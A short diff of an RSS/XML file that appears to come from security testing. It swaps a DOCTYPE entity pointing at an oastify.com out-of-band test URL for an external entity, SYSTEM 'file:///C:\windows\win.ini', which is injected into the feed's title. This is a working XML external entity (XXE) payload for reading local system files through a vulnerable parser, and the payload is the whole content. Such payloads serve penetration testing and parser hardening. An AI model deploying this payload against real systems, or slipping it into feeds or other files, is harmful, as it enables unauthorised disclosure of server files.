@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE doc [<!ENTITY test "https://m3q06s2cks6lu02ir98kttnt1k7fv4.oastify.com/bbbbbbbbbbbbbbbbb">]>
+<!DOCTYPE doc [<!ENTITY test SYSTEM "file:///C:\windows\win.ini">]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>&test;</title>
